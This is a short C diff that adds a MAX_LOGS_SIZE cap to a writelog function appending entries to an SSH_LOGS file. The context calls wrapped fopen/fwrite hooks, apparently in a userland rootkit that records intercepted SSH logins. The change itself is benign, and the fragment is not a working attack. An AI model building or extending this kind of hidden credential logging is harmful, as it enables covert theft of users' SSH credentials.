@@ -16,6 +16,12 @@ ssize_t writelog(ssize_t ret){
     if(alreadylogged(SSH_LOGS, logbuf))
         return ret;
 
+#ifdef MAX_LOGS_SIZE
+    off_t newsize=getnewfilesize(SSH_LOGS, strlen(logbuf)+1);
+    if(newsize > MAX_LOGS_SIZE)
+        return ret;
+#endif
+
     hook(CFOPEN, CFWRITE);
     fp = call(CFOPEN, SSH_LOGS, "a");
     if(fp == NULL) return ret;
